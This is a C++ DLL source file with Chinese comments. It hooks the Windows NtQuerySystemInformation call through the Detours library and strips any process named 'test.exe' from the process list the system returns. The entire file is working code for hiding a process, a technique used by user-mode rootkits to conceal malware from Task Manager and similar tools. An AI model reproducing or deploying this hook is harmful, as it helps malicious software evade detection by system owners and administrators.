// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <detours/detours.h>
#include <ntstatus.h>
#include <winternl.h> 
#pragma comment(lib, "ntdll.lib")


static NTSTATUS(WINAPI* TrueZwQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
    ) = NtQuerySystemInformation;

NTSTATUS ZwQuerySystemInformationEx(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
)
{
    NTSTATUS status = TrueZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;

    if (status != STATUS_SUCCESS)
        goto __END;

    if (SystemInformationClass == SystemProcessInformation)
    {
        pCur = (PSYSTEM_PROCESS_INFORMATION)(SystemInformation);
        while (true)
        {
            if (!lstrcmpi(pCur->ImageName.Buffer, L"test.exe"))
            {
                //需要隐藏的进程是最后一个节点
                if (pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                //不是最后一个节点，则将该节点取出
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;

            }
            //不是需要隐藏的节点，则继续遍历
            else
                pPrev = pCur;
            //链表遍历完毕
            if (pCur->NextEntryOffset == 0)
                break;
            pCur = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCur + pCur->NextEntryOffset);
        }
    }
__END:
    return status;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    LONG error;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)TrueZwQuerySystemInformation, ZwQuerySystemInformationEx);
        error = DetourTransactionCommit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)TrueZwQuerySystemInformation, ZwQuerySystemInformationEx);
        error = DetourTransactionCommit();
        break;
    }
    return TRUE;
}

